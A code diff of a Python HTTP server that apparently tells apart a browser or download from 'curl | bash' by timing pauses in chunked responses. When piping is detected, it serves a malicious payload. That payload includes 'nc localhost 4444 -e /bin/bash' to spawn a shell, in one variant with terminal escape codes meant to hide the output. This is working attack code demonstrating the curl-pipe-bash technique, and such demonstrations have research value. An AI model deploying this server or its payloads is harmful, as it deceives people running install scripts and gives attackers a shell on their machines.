@@ -5,13 +5,19 @@ from argparse import ArgumentParser
 SEND_BUFFER_SIZE = 87380
 NULL_CHUNK = chr(0) * SEND_BUFFER_SIZE
 MAX_CHUNKS = 64
+
+MIN_JUMP = 1
+SLEEP = 2
+
 HEADER = f'HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n'
 
 PAYLOAD = {
-    'default_hidden': 'sleep 2\necho "$(echo -e \033[1A\r || \033[1B\r\033[K\033[1A\r\033[K)"\b\b  \b\b',
-    'default_verbose': 'sleep 2\n',
+    'default_hidden': f'sleep {SLEEP}\n(echo -en "" || echo -en "\033[1B\r\033[K\033[1A\r\033[K"); echo -en "\r\033[K"\b \b',
+    'default_verbose': f'sleep {SLEEP}\n',
     'default': '',
+
     'good': 'No curl | bash detected',
+
     'bad_verbose': 'echo "Oops, curl | bash detected!" && nc localhost 4444 -e /bin/bash 2>/dev/null &',
     'bad_hidden': '"Oops, curl | bash detected!" && nc localhost 4444 -e /bin/bash 2>/dev/null &',
     'bad': ''
@@ -56,7 +62,7 @@ def handle(client: socket, request: str) -> None:
         send_chunk(NULL_CHUNK, client)
         timing.append(time() - start_time)
 
-    jumps = [timing[i+1] - timing[i] for i in range(len(timing) - 1)]
+    jumps = (timing[i+1] - timing[i] for i in range(len(timing) - 1))
     if max(jumps) > 1:
         print('Bash detected')
         send_chunk(PAYLOAD['bad'], client)
